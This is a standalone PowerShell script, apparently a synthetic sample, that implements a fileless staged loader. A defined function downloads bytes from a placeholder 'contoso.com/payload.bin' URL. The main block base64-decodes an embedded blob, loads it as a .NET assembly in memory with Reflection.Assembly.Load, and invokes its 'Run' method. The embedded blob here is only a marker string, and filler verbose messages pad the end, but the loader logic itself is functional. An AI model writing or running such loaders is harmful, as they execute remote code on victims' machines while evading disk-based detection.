
$TargetUrl = 'https://contoso.com/payload.bin'
$TracePath = "$env:TEMP\report.txt"
$TimeoutSec = 62
$ErrorActionPreference = "Stop"

function Get-StageAssemblyBytes {
    param(
        [string]$SourceUrl = "",
        [int]$TimeoutSec = 62
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

function Invoke-AssemblyEntryPoint {
    [CmdletBinding()]
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

try {
    Write-Verbose "Starting managed loader"
    $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpzcHA3ejBkdW0y')
    Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
    $StageResult = [Reflection.Assembly]::Load($PayloadBytes)
    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $StageResult
    Write-Verbose ("Entry result: " + $EntryResult)
}
catch {
    Write-Warning "Managed loader failed: $($_.Exception.Message)"
}

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $PayloadBytes.Length
    Endpoint = $TargetUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Validating result"
Write-Verbose "Applying operation timeout"
Write-Verbose "Reading configuration values"
Write-Verbose "Resolving configured target"
Write-Verbose "Retry budget remaining"
Write-Verbose "Checking local path"
Write-Verbose "Starting workflow"
Write-Verbose "Operation completed"
Write-Verbose "Inspecting process list"
Write-Verbose "Preparing working directory"
Write-Verbose "Collecting host metadata"
Write-Verbose "Writing diagnostic marker"
$ProgressPreference = "SilentlyContinue"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
